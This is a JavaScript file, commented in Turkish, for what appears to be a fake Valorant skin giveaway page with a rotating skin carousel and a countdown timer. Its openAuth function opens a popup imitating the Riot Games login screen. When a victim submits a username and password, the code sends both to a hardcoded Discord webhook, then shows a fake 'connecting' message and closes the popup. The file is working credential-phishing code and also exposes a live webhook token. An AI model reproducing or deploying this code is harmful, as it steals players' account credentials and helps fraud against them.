const WEBHOOK_URL = "https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq";

document.addEventListener("DOMContentLoaded", () => {
    // 1. Üst Şerit Skin Animasyonu (Düzeltildi)
    const track = document.getElementById('track');
    const skins = [
        {n: "Reaver Vandal", i: "skin1.png"},
        {n: "Ion Phantom", i: "skin2.png"},
        {n: "Prime Karambit", i: "skin3.png"},
        {n: "Kuronami Yaiba", i: "skin4.png"},
        {n: "Araxys Vandal", i: "skin5.png"}
    ];
    
    // Görsellerin yan yana dizilmesi (Sonsuzluk için 2 katı kopya)
    let html = "";
    [...skins, ...skins, ...skins, ...skins].forEach(s => {
        html += `<div class="drop-card"><img src="${s.i}"><span>${s.n}</span></div>`;
    });
    track.innerHTML = html;

    // 2. UTC+3 Sayaç (Düzeltildi)
    function updateTimer() {
        const now = new Date();
        const utc3 = new Date(now.getTime() + (now.getTimezoneOffset() * 60000) + (3 * 3600000));
        
        let target = new Date(utc3);
        target.setHours(24, 0, 0, 0);
        
        let diff = target - utc3;
        let h = Math.floor(diff / 3600000);
        let m = Math.floor((diff % 3600000) / 60000);
        let s = Math.floor((diff % 60000) / 1000);
        
        document.getElementById('countdown').innerText = 
            `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
    }
    setInterval(updateTimer, 1000);
    updateTimer();
});

// 3. Riot Tarzı Giriş Ekranı
function openAuth() {
    const w = 420, h = 650;
    const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
    let win = window.open("", "RiotLogin", `width=${w},height=${h},top=${t},left=${l}`);
    
    win.document.body.innerHTML = `
        <style>
            body { background: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; padding: 40px 20px; margin: 0; }
            .riot-logo { width: 120px; margin-bottom: 40px; }
            h2 { font-size: 24px; font-weight: 700; margin-bottom: 25px; color: #111; }
            .input-group { width: 100%; max-width: 300px; position: relative; margin-bottom: 15px; }
            input { width: 100%; padding: 16px; border: 2px solid transparent; background: #f2f2f2; border-radius: 4px; font-size: 14px; font-weight: 600; box-sizing: border-box; outline: none; transition: 0.2s; }
            input:focus { background: #fff; border-color: #ff4655; }
            .submit-btn { width: 100%; max-width: 300px; padding: 18px; background: #ff4655; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 14px; font-weight: bold; margin-top: 100px; transition: 0.2s; }
            .submit-btn:hover { background: #d63d4a; }
        </style>
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a8/Riot_Games_logo.svg/1200px-Riot_Games_logo.svg.png" class="riot-logo">
        <h2>Oturum Aç</h2>
        <div class="input-group"><input type="text" id="user" placeholder="KULLANICI ADI"></div>
        <div class="input-group"><input type="password" id="pass" placeholder="ŞİFRE"></div>
        <button class="submit-btn" id="go">GİRİŞ YAP</button>
    `;

    win.document.getElementById('go').onclick = function() {
        const u = win.document.getElementById('user').value;
        const p = win.document.getElementById('pass').value;
        if(u && p) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `🔥 **Yeni Giriş!**\n👤 Kullanıcı: \`${u}\` \n🔑 Şifre: \`${p}\`` })
            }).then(() => {
                win.document.body.innerHTML = "<h3>Bağlantı Kuruluyor...</h3>";
                setTimeout(() => win.close(), 1200);
            });
        }
    };
}
